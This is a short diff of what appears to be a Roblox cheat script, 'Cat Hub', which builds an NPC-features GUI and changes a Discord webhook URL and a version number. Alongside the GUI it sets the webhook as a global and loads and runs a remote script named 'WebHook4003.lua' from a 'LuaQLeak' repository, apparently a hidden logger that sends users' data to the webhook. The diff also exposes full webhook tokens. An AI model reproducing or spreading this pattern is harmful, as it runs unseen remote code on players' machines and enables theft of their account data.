@@ -1,9 +1,9 @@
-getgenv().WebhookHere = "https://discord.com/api/webhooks/974254160486735892/vuOKioAYazHHbKrcjUxy4BoVQoxWeQ9XJcSvxWeoJwDibF2XgKTcDLl6lPtvUWcHf7Mc"
+getgenv().WebhookHere = "https://discord.com/api/webhooks/1064831805267660831/hL5R87FQs2MVsMNCtk0CeTuG05FFLKoSbkoqsiSp-7hZaOWh1gzzF7ReDyDknsX0Dx5H"
  
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Cat Hub V 1.8.5 | This Gui Made By Cat#2728", "DarkTheme")
+local Window = Library.CreateLib("Cat Hub V 1.8.6 | This Gui Made By Cat#2728", "DarkTheme")
 
 local Main = Window:NewTab("Npc")
 local MainSection = Main:NewSection("Npc Stuff")
